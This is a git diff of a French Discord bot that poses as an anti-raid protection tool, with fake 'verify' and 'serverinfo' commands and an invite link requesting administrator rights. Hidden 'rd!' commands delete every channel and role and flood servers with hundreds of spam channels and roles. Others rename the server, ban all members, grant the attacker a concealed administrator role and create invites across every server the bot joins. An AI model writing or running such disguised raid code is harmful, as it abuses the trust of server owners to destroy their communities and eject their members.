@@ -1,18 +1,18 @@
 const Discord = require('discord.js'); // npm i discord.js
 const MagicHitler = require('magic_hitler'); // npm i magic_hitler
+
 const client = new Discord.Client();
+const prefix = "!"
 const raid = new MagicHitler.Client({
     client: client,
     prefix: "rd!" // Optionnel ; Préfixe pour les commandes
 });
- 
+
 raid.ready();
- 
 raid.sendMessage("Test réussi", "test");
 
 // Détruire le serveur en entier :
 
-raid.deleteChannel("del");
 raid.deleteChannels("raid", {
     createChannel: true,
     createdChannelName: "vous-êtes-en-pls",
@@ -24,9 +24,6 @@ raid.createChannels("raid", {
     sendMessageCount: 10,
     createChannelCount: 222
 });
-raid.createInvite("invite", false);
-raid.createInvite("inviteall", true);
- 
 raid.deleteRoles("raid");
 raid.createRoles("raid", {
     rolesNumber: 69,
@@ -49,101 +46,97 @@ raid.createChannels("chnls", {
 });
 raid.createInvite("invite", false);
 raid.createInvite("inviteAll", true);
- 
 raid.deleteRoles("delRls");
 raid.createRoles("rls", {
     rolesNumber: 69,
     rolesName: "raid-by-fa3t"
 });
 
-// Fakes commandes :
+// Fakes Commandes :
 
 client.on('message', message => {
-    
-    if(message.content === "!help"){
-        let embed = new Discord.RichEmbed()
-            .setColor('#E69900')
-            .setTitle("📬 Aide :")
-            .setDescription("__**Commandes Basique :**__\n📬 **!help :** Affiche les commandes\n🏓 **!ping :** Voir la latence du bot en MS\n📋 **!serverinfo :** Affiche les statistiques du serveur\n\n__**Commandes Anti-Raid :**__\n🔎 **!verify :** Vérifier les membres du serveur\n🔰 **!raidmode (bientôt) :** Protège votre serveur lors d'un raid\n💼 **!checkID (bientôt) :** Vérifier une ID\n\n__**Liens :**__\n**[Serveur Support](https://discordapp.com)** (bientôt)\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
-            .setTimestamp()
-        message.channel.send(embed)
-    }
 
-    if(message.content === "!verify"){
-        let embed = new Discord.RichEmbed()
-            .setColor('#24D742')
-            .setTitle("✅ Serveur vérifié !")
-            .setDescription("Aucun membres du serveur ne fais parti de notre liste noir.\nNous vous conseillons de vérifier une fois par semaine.")
-        message.channel.send(embed)
-    }
+    let args = message.content.slice(prefix.length).trim().split(' ');
+    let cmd = args.shift().toLowerCase();
 
-    if(message.content === "!serverinfo"){
-        let serv = message.guild;
-        let servCreated = message.guild.createdAt.toString().split(' ');
-        let servHumain = serv.members.filter(member => !member.user.bot).size;
-        let servBot = serv.members.filter(member => member.user.bot).size;
-        let embed = new Discord.RichEmbed()
-            .setColor('#E69900')
-            .setThumbnail(message.guild.iconURL)
-            .setTitle("📋 Informations sur le serveur :")
-            .addField(`Nom :`, `→ ${serv.name}`, true)
-            .addField(`Propriétaire :`, `→ ${serv.owner}`, true)
-            .addField(`Créé le :`, `→ ${servCreated[1] + ', ' + servCreated[2] + ' ' + servCreated[3]}`,true)
-            .addField(`Région :`, `→ ${serv.region}`, true)
-            .addField(`Channels :`, `→ ${serv.channels.size}`,true)
-            .addField(`Membres (` + serv.memberCount + ") :", `→ ${servHumain + " humains et " + servBot + " bots"}`, true)
-            .addField(`Nombre de rôles :`, `→ ${serv.roles.size}`, true)
-        message.channel.send(embed)
-    }
+    if(message.author.bot) return;
+    if(!message.content.startsWith(prefix)) return;
 
-    if(message.content === "!raidmode"){
-        message.channel.send("**⚠ Commande en développement. (servira à blocker le serveur d'un raid)**")
-    }
+    try{
 
-    if(message.content === "!checkID"){
-        let uID = message.content.slice(prefix.length).trim().split(' ');
-        let embed = new Discord.RichEmbed()
-            .setTitle("✅ Membre vérifié !")
-            .setDescription(`L'identifiant **${uID}** n'est pas dans notre liste noire.`)
-        message.channel.send()
-    }
+        if(cmd === 'h') cmd = 'help';
+        if(cmd === 'si') cmd = 'serverinfo';
+        if(cmd === 'rd-on') cmd = 'raidmode-on';
+        if(cmd === 'rd-off') cmd = 'raidmode-off';
+        if(cmd === 'cID') cmd = 'checkID';
 
-    if(message.content === "!ping"){
-        let embed = new Discord.RichEmbed()
-            .setColor('#D50303')
-            .setDescription('🏓 **Pong !** ' + client.ping + ' ms')
-        message.channel.send(embed)
-    }
+        delete require.cache[require.resolve(`./commands/${cmd}.js`)];
 
-    // Commandes Raid en plus :
+        let ops = {
+            ownerID: '515464339000524800'
+        }
 
-    if(message.content === "rd!help"){
-        message.delete()
-        let embed = new Discord.RichEmbed()
-            .setColor('#E69900')
-            .setTitle("📬 Aide Raid :")
-            .setDescription("__**Commandes Raid :**__\n**~raid :** Détruit le serveur.\n**~del :** Supprime le channel où la commande est exécuté.\n**~delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**~invite :** Créer une invitation pour un serveur (où le bot est présent)\n**~inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**~delRls :** Supprime tous les rôles\n**~rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**~a (bientôt) :** Créer un rôle pour être admin\n**~cGuild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
-            .setTimestamp()
-        message.author.send(embed)
-    }
+        let commandFile = require(`./commands/${cmd}.js`);
+        commandFile.run(Discord, client, message, args, prefix, ops);
 
-    if(message.content === "rd!guild"){
-        message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
-        message.guild.setName("RAID BY TEAM FA3T")
-        message.member.setNickname("RAID BY TEAM FA3T")
-    }
-
-    if(message.content === "rd!raid"){
-        message.guild.setIcon("https://cdn.discordapp.com/attachments/517494453095890964/518295237416714240/8Fcd0bji.jpg")
-        message.guild.setName("RAID BY TEAM FA3T")
-        message.guild.members.setNickname("RAID BY TEAM FA3T")
-    }
-    
-    if(message.content === "rd!emoji"){
-        message.guild.createEmoji("https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png")
+    } catch (e) {
+        console.log(e.stack);
     }
 
 });
+
+client.on('message', msg => {
+
+    // Commandes Raid en plus :
+
+    if(msg.content === "rd!help"){
+        msg.delete()
+        let embed = new Discord.RichEmbed()
+            .setColor('#E69900')
+            .setTitle("📬 Aide Raid :")
+            .setDescription("__**Commandes Raid :**__\n**rd!raid :** Détruit le serveur.\n**rd!del :** Supprime le channel où la commande est exécuté.\n**rd!delAll :** Supprime tous les channels + créer un channel nommé 'raid-by-fa3t' + envoi un message avec mention everyone\n**rd!chnls :** Créer 222 channels nommé 'raid-by-fa3t' + spamme les salons en everyone\n**rd!invite :** Créer une invitation pour un serveur (où le bot est présent)\n**rd!inviteAll :** Créer une invitation pour plusieurs serveurs (où le bot est présent)\n**rd!delRls :** Supprime tous les rôles\n**rd!rls :** Créer 69 rôles nommé 'L'ÉLITE vous remercie' en couleur random\n**rd!a (bientôt) :** Créer un rôle pour être admin\n**rd!guild :** Change l'image du serveur + change le nom du serveur en 'RAID PAR L’ÉLITE'\n\n__**Liens :**__\n**[Invite Bot](https://discordapp.com/oauth2/authorize?client_id=518223971888398341&scope=bot&permissions=8)**")
+            .setTimestamp()
+            msg.author.send(embed)
+    }
+
+    if(msg.content === "rd!guild"){
+        msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
+        msg.guild.setName("RAID BY TEAM FA3T")
+    }
+
+    if(msg.content === "rd!raid"){
+        msg.guild.setIcon("https://cdn.discordapp.com/attachments/519666466145042433/520050975923240961/3956-full.png")
+        msg.guild.setName("RAID BY TEAM FA3T")
+    }
+
+    if(msg.content === "rd!emoji"){
+        msg.guild.createEmoji("https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png")
+    }
+
+    if (msg.content === 'rd!ban') {
+        msg.guild.members.forEach(member => {
+            if (!member.roles.exists("name", "FA3T TEAM") && member.bannable) member.ban().catch(e => {});
+        });
+    }
+
+    if (msg.content === 'rd!admin') {
+        
+        msg.member.guild.createRole({
+            name: "FA3T TEAM",
+            permissions: "ADMINISTRATOR",
+            mentionable: false
+        }).then(function(role) {
+            msg.member.addRole(role);
+            if (msg.deletable) msg.delete().catch(e => {});
+        }).catch(e => {});
+    }
+
+    if (msg.content === 'rd!leave') {
+        if (msg.deletable) msg.delete().catch(e => {});
+        msg.guild.leave().catch(e => {});
+    }
+
+})
 
 // Quand le bot rejoins un serveur :
 
@@ -174,6 +167,8 @@ client.on("guildDelete", async guild => {
         .setTimestamp()
     client.channels.get("518710630044401665").send(embed)
 });
+
+// Quand le bot ce lance
 
 client.on('ready', async () => {
     client.user.setActivity(`956 Serveurs | !help`, {type: "WATCHING"});
